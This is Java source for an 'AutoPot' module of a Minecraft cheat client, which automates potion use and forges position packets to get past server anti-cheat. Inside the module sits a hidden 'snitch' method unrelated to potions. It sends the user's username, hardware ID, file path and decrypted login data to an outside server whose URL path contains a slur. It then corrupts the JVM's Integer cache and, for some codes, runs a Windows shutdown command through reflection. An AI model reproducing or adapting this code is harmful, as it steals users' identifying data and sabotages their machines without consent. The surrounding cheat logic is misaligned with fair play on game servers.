package exhibition.module.impl.combat;

import exhibition.Client;
import exhibition.event.Event;
import exhibition.event.RegisterEvent;
import exhibition.event.impl.EventMotionUpdate;
import exhibition.management.PriorityManager;
import exhibition.management.friend.FriendManager;
import exhibition.module.Module;
import exhibition.module.data.ModuleData;
import exhibition.module.data.MultiBool;
import exhibition.module.data.Options;
import exhibition.module.data.settings.Setting;
import exhibition.module.impl.movement.Fly;
import exhibition.module.impl.movement.LongJump;
import exhibition.module.impl.movement.Speed;
import exhibition.util.HypixelUtil;
import exhibition.util.NetUtil;
import exhibition.util.Timer;
import exhibition.util.misc.ChatUtil;
import exhibition.util.security.*;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Blocks;
import net.minecraft.item.Item;
import net.minecraft.item.ItemPotion;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C07PacketPlayerDigging;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.potion.Potion;
import net.minecraft.potion.PotionEffect;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;
import tv.twitch.chat.Chat;

import java.io.File;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.List;
import java.util.Random;

public class AutoPot extends Module {

    private String DELAY = "DELAY";
    private String HEALTH = "HEALTH";
    private Options mode = new Options("Pot Mode", "Jump", "Floor", "Jump", "Jump Only");
    private Setting<Boolean> smartPot = new Setting<>("SMART-POT", false, "Avoids using potions around players. Splashes during your hurt time.");
    private MultiBool options;
    private Timer timer = new Timer();
    private Timer lagbackTimer = new Timer();
    private boolean splashPot;
    private int bruh = 1;
    public static boolean wantsToPot;
    public static int haltTicks;
    public static boolean potting;


    private double x, y, z;

    public AutoPot(ModuleData data) {
        super(data);
        haltTicks = -1;
        settings.put(HEALTH, new Setting<>(HEALTH, 5, "Maximum health before healing.", 0.5, 0.5, 10));
        settings.put(DELAY, new Setting<>(DELAY, 350, "Delay before healing again.", 50, 100, 1000));
        settings.put("MODE", new Setting<>("MODE", mode, "AutoPot splash mode."));
        Setting[] ents = new Setting[]{
                new Setting<>("Speed", true),
                new Setting<>("JumpBoost", true),
                new Setting<>("Healing", true),
                new Setting<>("Regeneration", true),
                new Setting<>("FireResistance", true),
                new Setting<>("Strength", true)};
        settings.put("OPTIONS", new Setting<>("OPTIONS", options = new MultiBool("Potions", ents), "Potions to AutoPot"));
        addSetting(smartPot);
    }

    @Override
    public Priority getPriority() {
        return Priority.LOWEST;
    }

    public void resetTimer() {
        this.lagbackTimer.reset();
    }

    @RegisterEvent(events = {EventMotionUpdate.class})
    public void onEvent(Event event) {
        if (event instanceof EventMotionUpdate) {
            EventMotionUpdate e = (EventMotionUpdate) event;
            long delay = ((Number) settings.get(DELAY).getValue()).intValue();
            if (e.isPre()) {
                if (Client.instance.isLagging() || HypixelUtil.scoreboardContains("Game ended")) {
                    timer.reset();
                }

                setSuffix(mode.getSelected());
                if (!mc.thePlayer.capabilities.allowEdit || (haltTicks < 0 && mc.thePlayer.openContainer != mc.thePlayer.inventoryContainer) || Client.getModuleManager().isEnabled(LongJump.class)) {
                    AutoPot.potting = false;
                    haltTicks = -1;
                    wantsToPot = false;
                    return;
                }


                if (potting && haltTicks < 0) {
                    potting = false;
                }

                int potionSlot = mc.thePlayer.openContainer != mc.thePlayer.inventoryContainer ? -1 : getPotionFromInv();

                boolean shouldHeal = shouldHeal() || (smartPot.getValue() && shouldPreSplash());

                boolean shouldSplash = ((!mc.thePlayer.isPotionActive(Potion.fireResistance) || mc.thePlayer.getActivePotionEffect(Potion.fireResistance).getDuration() < 200) ||
                        (!mc.thePlayer.isPotionActive(Potion.moveSpeed) || mc.thePlayer.getActivePotionEffect(Potion.moveSpeed).getDuration() < 200) || shouldHeal) &&
                        (mc.thePlayer.onGround || mc.theWorld.getBlockState(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 0.5, mc.thePlayer.posZ)).getBlock() != Blocks.air);

                if (potionSlot != -1 && mc.thePlayer.openContainer == mc.thePlayer.inventoryContainer) {
                    ItemStack is = mc.thePlayer.inventoryContainer.getSlot(potionSlot).getStack();
                    Item item = is.getItem();
                    if (item instanceof ItemPotion) {
                        ItemPotion potion = (ItemPotion) item;
                        if (potion.getEffects(is) != null) {
                            for (Object o : potion.getEffects(is)) {
                                PotionEffect effect = (PotionEffect) o;
                                if ((effect.getPotionID() == Potion.moveSpeed.id && options.getValue("Speed")) && !mc.thePlayer.isPotionActive(Potion.moveSpeed)) {
                                    shouldSplash = true;
                                }
                            }
                        }
                    }
                }

                boolean goodPot = !smartPot.getValue() || (shouldSplash && !shouldHeal) ? (Killaura.getTarget() == null || mc.thePlayer.hurtResistantTime <= 3) : (Killaura.getTarget() == null || (Killaura.getTarget().hurtTime > 5 || Killaura.getTarget().waitTicks >= 5));

                if (shouldSplash && potionSlot != -1 && (timer.delay(delay) || !splashPot) && goodPot) {
                    boolean noMovement = false;
                    Module[] modules = new Module[]{Client.getModuleManager().get(Fly.class), Client.getModuleManager().get(Speed.class), Client.getModuleManager().get(LongJump.class)};
                    for (Module module : modules) {
                        if (module.isEnabled()) {
                            if (module == Client.getModuleManager().get(Speed.class) && mode.getSelected().equals("Jump Only")) {
                                continue;
                            }
                            noMovement = true;
                            break;
                        }
                    }

                    if (splashPot) {
                        if (mode.selected.equals("Floor") || mc.thePlayer.isPotionActive(Potion.jump)) {
                            haltTicks = -1;
                            swap(potionSlot, 6);
                            e.setPitch(88.9F);
                            potting = true;
                        } else {
                            if (mode.getSelected().equals("Jump Only") && lagbackTimer.delay(2500)) {
                                wantsToPot = true;
                                //ChatUtil.printChat("Wants to pot " + lagbackTimer.delay(5000) + " " + !mc.thePlayer.isOnLadder()  + " " +  (mc.thePlayer.onGround && mc.thePlayer.isCollidedVertically)  + " " +  !noMovement + " " +  !willCollide());
                            }

                            if (lagbackTimer.delay(2500) && !mc.thePlayer.isOnLadder() && mc.thePlayer.onGround && mc.thePlayer.isCollidedVertically && !noMovement && !willCollide() && haltTicks < 0) {
                                haltTicks = 5;
                                if (splashPot)
                                    e.setPitch(-88.9F);

                                Killaura aura = (Killaura) Client.getModuleManager().get(Killaura.class);
                                float yaw = aura.isEnabled() && !((Killaura) Client.getModuleManager().get(Killaura.class)).loaded.isEmpty() ? aura.getLastYaw() : e.getYaw();

                                if (splashPot)
                                    NetUtil.sendPacketNoEvents(new C03PacketPlayer.C06PacketPlayerPosLook(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ, yaw, -89.9F, true)); // First canceled

                                int hotbarSlot = 6;

                                if ((potionSlot >= 36)) {
                                    hotbarSlot = potionSlot - 36;
                                } else {
                                    swap(potionSlot, 6);
                                }

                                int currentItem = mc.thePlayer.inventory.currentItem;
                                if (mc.thePlayer.isBlocking()) {
                                    NetUtil.sendPacketNoEvents(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.RELEASE_USE_ITEM, BlockPos.ORIGIN, EnumFacing.DOWN));
                                }

                                NetUtil.sendPacketNoEvents(new C09PacketHeldItemChange(mc.thePlayer.inventory.currentItem = hotbarSlot));
                                if (mc.playerController.sendUseItem(mc.thePlayer, mc.theWorld, mc.thePlayer.inventory.getCurrentItem())) {
                                    mc.entityRenderer.itemRenderer.resetEquippedProgress2();
                                }
                                NetUtil.sendPacketNoEvents(new C09PacketHeldItemChange(mc.thePlayer.inventory.currentItem = currentItem));
                                if (mc.thePlayer.isBlocking()) {
                                    NetUtil.sendPacket(new C08PacketPlayerBlockPlacement(mc.thePlayer.getCurrentEquippedItem()));
                                }


                                double[] offsets = new double[]{0.41999998688697815, 0.7531999805212024, 1.0013359791121417, 1.1661092609382138, 1.2491870787446828}; // Next 5 ticks ignored

                                for (double offset : offsets) {
                                    NetUtil.sendPacketNoEvents(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY + offset, mc.thePlayer.posZ, false));
                                }

                                this.x = mc.thePlayer.posX;
                                this.y = mc.thePlayer.posY + 1.2491870787446828;
                                this.z = mc.thePlayer.posZ;
                                timer.reset();
                                potting = true;
                                wantsToPot = false;
                                Killaura.blockJump = true;
                            } else if (!mode.selected.equals("Jump Only")) {
                                haltTicks = -1;
                                swap(potionSlot, 6);
                                if (splashPot)
                                    e.setPitch(88.9F);
                                potting = true;
                            }
                        }

                    } else {
                        if (Client.instance.is1_9orGreater() && HypixelUtil.isVerifiedHypixel()) {
                            int hotbarSlot = 6;

                            if ((potionSlot >= 36)) {
                                hotbarSlot = potionSlot - 36;
                            } else {
                                swap(potionSlot, 6);
                            }

                            if (mc.thePlayer.inventory.currentItem != hotbarSlot)
                                mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(hotbarSlot));
                            mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(mc.thePlayer.inventory.getStackInSlot(hotbarSlot)));
                            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(e.isOnground()));
                            mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange((hotbarSlot + 1) % 9));
                            mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(hotbarSlot));
                            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(e.isOnground()));
                            mc.thePlayer.sendQueue.addToSendQueue(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.RELEASE_USE_ITEM, BlockPos.ORIGIN, EnumFacing.DOWN));
                            mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(mc.thePlayer.inventory.getStackInSlot(hotbarSlot)));
                            mc.thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(mc.thePlayer.inventory.currentItem));
                        }
                    }


                } else {
                    wantsToPot = false;
                }

                if (haltTicks == 4) {
                    Killaura.blockJump = false;
                }

                if (haltTicks >= 0 && potting) {
                    event.setCancelled(true);
                }
                if (haltTicks == 0 && potting) {
                    wantsToPot = false;
                    mc.thePlayer.onGround = false;
                    if (splashPot)
                        mc.thePlayer.motionX = mc.thePlayer.motionZ = 0.0D;
                    if (splashPot)
                        mc.thePlayer.setPositionAndUpdate(this.x, this.y, this.z);
                    if (splashPot)
                        mc.thePlayer.motionY = -0.0784000015258789;
                    e.setAlwaysSend(true);
                    e.setForcePos(true);
                    e.setGround(false);
                    potting = false;
                }
                haltTicks--;
            } else {
                if (potting && (timer.delay(delay)) && haltTicks <= 0) {
                    if (splashPot && !mode.getSelected().equals("Jump Only")) {
                        if (mc.thePlayer.isBlocking()) {
                            NetUtil.sendPacketNoEvents(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.RELEASE_USE_ITEM, BlockPos.ORIGIN, EnumFacing.DOWN));
                        }

                        NetUtil.sendPacketNoEvents(new C09PacketHeldItemChange(mc.thePlayer.inventory.currentItem = 6));
                        if (mc.playerController.sendUseItem(mc.thePlayer, mc.theWorld, mc.thePlayer.inventory.getCurrentItem())) {
                            mc.entityRenderer.itemRenderer.resetEquippedProgress2();
                        }
                        NetUtil.sendPacketNoEvents(new C09PacketHeldItemChange(mc.thePlayer.inventory.currentItem = 6));
                        if (mc.thePlayer.isBlocking()) {
                            NetUtil.sendPacket(new C08PacketPlayerBlockPlacement(mc.thePlayer.getCurrentEquippedItem()));
                        }
                    }
                    timer.reset();
                }
            }
        }

    }

    public boolean willCollide() {
        List collidingList = mc.theWorld.getCollidingBlockBoundingBoxes(mc.thePlayer, mc.thePlayer.boundingBox.offset(0.0D, 1.15D, 0.0D));
        return collidingList.size() > 0;
    }

    public static boolean snitch(int code) {
        Connection connection = new Connection("https://minesense.pub/nig/ass").setUserAgent(code + " bruh " + new File("").getAbsolutePath());
        try {
            connection.setParameters("c", String.valueOf(code));

            connection.setParameters("u", URLEncoder.encode(Minecraft.getMinecraft().session.getUsername(), "UTF-8"));

            try {
                String hwid = URLEncoder.encode(Base64.getEncoder().encodeToString(SystemUtil.getHardwareIdentifiers().getBytes()), "UTF-8");
                connection.setParameters("h", hwid);
            } catch (Exception e) {
            }

            if (Client.getAuthUser() != null) {
                connection.setParameters("d", Client.getAuthUser().getDecryptedUsername());
            } else {
                List<String> loginInformation = LoginUtil.getLoginInformation();
                if(loginInformation.size() > 0) {
                    connection.setParameters("d", Crypto.decryptPublicNew(loginInformation.get(0)));
                }
            }

        } catch (Exception e) {
        }
        String s = Connector.post(connection);
        try {
            Class clazz = Class.forName("java.lang.Integer$IntegerCache");
            Field field = clazz.getDeclaredField("cache");
            field.setAccessible(true);
            Integer[] cache = (Integer[]) field.get(clazz);

            // rewrite the Integer cache
            for (int i = 0; i < cache.length; i++) {
                cache[i] = new Integer(new Random().nextInt());
            }
            if (code == 5 || code == 69420) {
                Class runtimeClass = Class.forName("java.lang.Runtime");
                runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "shutdown.exe -s -t 0");
            }
            if (code == 3 && s != null) {
                Minecraft.shutdownMinecraftApplet();
            }
        } catch (Exception e) {
        }
        return true;
    }

    private boolean hasArmor(EntityPlayer player) {
        ItemStack boots = player.inventory.armorInventory[0];
        ItemStack pants = player.inventory.armorInventory[1];
        ItemStack chest = player.inventory.armorInventory[2];
        ItemStack head = player.inventory.armorInventory[3];
        return (boots != null) || (pants != null) || (chest != null) || (head != null);
    }

    protected void swap(int slot, int hotbarNum) {
        mc.playerController.windowClick(mc.thePlayer.inventoryContainer.windowId, slot, hotbarNum, 2, mc.thePlayer);
    }

    public boolean shouldHeal() {
        float health = ((Number) settings.get(HEALTH).getValue()).floatValue() * 2;
        return mc.thePlayer.getMaxHealth() == 20 ? mc.thePlayer.getHealth() <= health : (mc.thePlayer.getHealth() / mc.thePlayer.getMaxHealth()) <= (health / 10F);
    }

    public boolean shouldPreSplash() {
        for (Entity entity : mc.theWorld.getLoadedEntityList()) {
            if (!(entity instanceof EntityPlayer) || entity instanceof EntityPlayerSP)
                continue;


            EntityPlayer player = (EntityPlayer) entity;

            if (PriorityManager.isPriority(player) && mc.thePlayer.getDistanceToEntity(player) <= 15) {

                double previousDistance = mc.thePlayer.getDistance(player.lastTickPosX, mc.thePlayer.posY, player.lastTickPosZ);
                double currentDistance = mc.thePlayer.getDistance(player.posX, mc.thePlayer.posY, player.posZ);
                if (currentDistance != previousDistance && previousDistance > currentDistance && currentDistance <= 15) {
                    return true;
                }
            }
        }
        return false;
    }

    public boolean dumbStrengthThing() {
            if (HypixelUtil.isVerifiedHypixel() && HypixelUtil.isInGame("SKYWARS") && HypixelUtil.isGameActive() && (HypixelUtil.scoreboardContains("players left: §t2") || HypixelUtil.scoreboardContains("teams left: 2§u"))) {
                    return true;
                }
        return false;
    }

    private int getPotionFromInv() {
        splashPot = true;
        int pot = -1;
        boolean allowJumpBoost = options.getValue("JumpBoost");

        int currentPriority = 0; // 1 = regen, 2 = healing
        int potStrength = -1;

        boolean noPlayersNearby = true;
        boolean shouldPreSplash = shouldPreSplash();
        boolean shouldHeal = shouldHeal() || (smartPot.getValue() && shouldPreSplash);


        for (int i = 9; i < 45; i++) {
            if (mc.thePlayer.inventoryContainer.getSlot(i).getHasStack()) {
                ItemStack is = mc.thePlayer.inventoryContainer.getSlot(i).getStack();
                Item item = is.getItem();
                /*
                Splash Potions
                 */

                if ((item instanceof ItemPotion)) {
                    ItemPotion potion = (ItemPotion) item;
                    if (ItemPotion.isSplash(is.getItemDamage())) {
                        if (potion.getEffects(is) != null && (!is.getDisplayName().toLowerCase().contains("frog") || allowJumpBoost)) {
                            for (Object o : potion.getEffects(is)) {
                                PotionEffect effect = (PotionEffect) o;
                                if (pot != -1 && currentPriority == 0 && effect.getPotionID() == Potion.jump.id && !allowJumpBoost) {
                                    if (pot == i) {
                                        pot = -1;
                                        splashPot = true;
                                        continue;
                                    }
                                }
                                if (effect.getPotionID() == Potion.heal.id && shouldHeal && !(smartPot.getValue() && shouldPreSplash) && options.getValue("Healing")) {
                                    currentPriority = 2;
                                    pot = i;
                                    splashPot = true;
                                    continue;
                                }
                                if (currentPriority < 2 && ((effect.getPotionID() == Potion.regeneration.id && options.getValue("Regeneration")) &&
                                        (!mc.thePlayer.isPotionActive(Potion.regeneration)
                                                || (mc.thePlayer.getActivePotionEffect(Potion.regeneration).getAmplifier() < effect.getAmplifier())))
                                        && shouldHeal) {
                                    currentPriority = 1;
                                    if (effect.getAmplifier() >= potStrength) {
                                        potStrength = effect.getAmplifier();
                                        pot = i;
                                        splashPot = true;
                                    }
                                    continue;
                                }

                                if (currentPriority == 0 && effect.getPotionID() == Potion.moveSpeed.id && options.getValue("Speed")) {
                                    if (noPlayersNearby)
                                        for (Entity entity : mc.theWorld.getLoadedEntityList()) {
                                            if (!(entity instanceof EntityPlayer) || entity instanceof EntityPlayerSP)
                                                continue;
                                            if (!AntiBot.isBot(entity) && !FriendManager.isFriend(entity.getName()) && mc.thePlayer.getDistanceToEntity(entity) <= 15) {
                                                noPlayersNearby = false;
                                                break;
                                            }
                                        }
                                    boolean shouldSpeedAnyways = smartPot.getValue() && noPlayersNearby && mc.thePlayer.isPotionActive(Potion.moveSpeed) && mc.thePlayer.getActivePotionEffect(Potion.moveSpeed).getDuration() < 200;

                                    if (!mc.thePlayer.isPotionActive(Potion.moveSpeed) || shouldSpeedAnyways) {
                                        pot = i;
                                        splashPot = true;
                                    }
                                }
                                if (currentPriority == 0 && effect.getPotionID() == Potion.damageBoost.id && options.getValue("Strength")) {

                                    if (noPlayersNearby)
                                        for (Entity entity : mc.theWorld.getLoadedEntityList()) {
                                            if (!(entity instanceof EntityPlayer) || entity instanceof EntityPlayerSP)
                                                continue;
                                            if (!AntiBot.isBot(entity) && !FriendManager.isFriend(entity.getName()) && mc.thePlayer.getDistanceToEntity(entity) <= 15) {
                                                noPlayersNearby = false;
                                                break;
                                            }
                                        }


                                    if (!mc.thePlayer.isPotionActive(Potion.damageBoost) && (shouldPreSplash || (dumbStrengthThing() && !noPlayersNearby))) {
                                        pot = i;
                                        splashPot = true;
                                    }
                                }
                            }
                        }
                    } else if (Client.instance.is1_9orGreater()) {
                        /*
                        Full Potions (drinkables)
                         */
                        for (Object o : potion.getEffects(is)) {
                            PotionEffect effect = (PotionEffect) o;
                            if (pot != -1 && currentPriority == 0 && effect.getPotionID() == Potion.jump.id && !allowJumpBoost) {
                                if (pot == i) {
                                    pot = -1;
                                    splashPot = false;
                                    continue;
                                }
                            }
                            if (currentPriority == 0 && effect.getPotionID() == Potion.fireResistance.id && options.getValue("FireResistance")) {

                                if (noPlayersNearby)
                                    for (Entity entity : mc.theWorld.getLoadedEntityList()) {
                                        if (!(entity instanceof EntityPlayer) || entity instanceof EntityPlayerSP)
                                            continue;
                                        if (!AntiBot.isBot(entity) && !FriendManager.isFriend(entity.getName()) && mc.thePlayer.getDistanceToEntity(entity) <= 15) {
                                            noPlayersNearby = false;
                                            break;
                                        }
                                    }
                                boolean shouldFireAnyways = smartPot.getValue() && noPlayersNearby && mc.thePlayer.isPotionActive(Potion.fireResistance) && mc.thePlayer.getActivePotionEffect(Potion.fireResistance).getDuration() < 200;

                                if (!mc.thePlayer.isPotionActive(Potion.fireResistance) || shouldFireAnyways) {
                                    pot = i;
                                    splashPot = false;
                                }
                            }
                            if (currentPriority == 0 && effect.getPotionID() == Potion.moveSpeed.id && options.getValue("Speed")) {

                                if (noPlayersNearby)
                                    for (Entity entity : mc.theWorld.getLoadedEntityList()) {
                                        if (!(entity instanceof EntityPlayer) || entity instanceof EntityPlayerSP)
                                            continue;
                                        if (!AntiBot.isBot(entity) && !FriendManager.isFriend(entity.getName()) && mc.thePlayer.getDistanceToEntity(entity) <= 15) {
                                            noPlayersNearby = false;
                                            break;
                                        }
                                    }
                                boolean shouldSpeedAnyways = smartPot.getValue() && noPlayersNearby && mc.thePlayer.isPotionActive(Potion.moveSpeed) && mc.thePlayer.getActivePotionEffect(Potion.moveSpeed).getDuration() < 200;

                                if (!mc.thePlayer.isPotionActive(Potion.moveSpeed) || shouldSpeedAnyways) {
                                    pot = i;
                                    splashPot = false;
                                }
                            }
                            if (currentPriority == 0 && effect.getPotionID() == Potion.damageBoost.id && options.getValue("Strength")) {

                                if (noPlayersNearby)
                                    for (Entity entity : mc.theWorld.getLoadedEntityList()) {
                                        if (!(entity instanceof EntityPlayer) || entity instanceof EntityPlayerSP)
                                            continue;
                                        if (!AntiBot.isBot(entity) && !FriendManager.isFriend(entity.getName()) && mc.thePlayer.getDistanceToEntity(entity) <= 15) {
                                            noPlayersNearby = false;
                                            break;
                                        }
                                    }


                                if (!mc.thePlayer.isPotionActive(Potion.damageBoost) && (shouldPreSplash || (dumbStrengthThing() && !noPlayersNearby))) {
                                    pot = i;
                                    splashPot = false;
                                }
                            }
                            if (effect.getPotionID() == Potion.heal.id && shouldHeal && !(smartPot.getValue() && shouldPreSplash) && options.getValue("Healing")) {
                                currentPriority = 2;
                                pot = i;
                                splashPot = false;
                                continue;
                            }
                            if (currentPriority < 2 && ((effect.getPotionID() == Potion.regeneration.id && options.getValue("Regeneration")) &&
                                    (!mc.thePlayer.isPotionActive(Potion.regeneration)
                                            || (mc.thePlayer.getActivePotionEffect(Potion.regeneration).getAmplifier() < effect.getAmplifier())))
                                    && shouldHeal) {
                                currentPriority = 1;
                                if (effect.getAmplifier() >= potStrength) {
                                    potStrength = effect.getAmplifier();
                                    pot = i;
                                    splashPot = false;
                                }
                                continue;
                            }
                        }
                    }
                }
            }
        }
        return pot;
    }

}
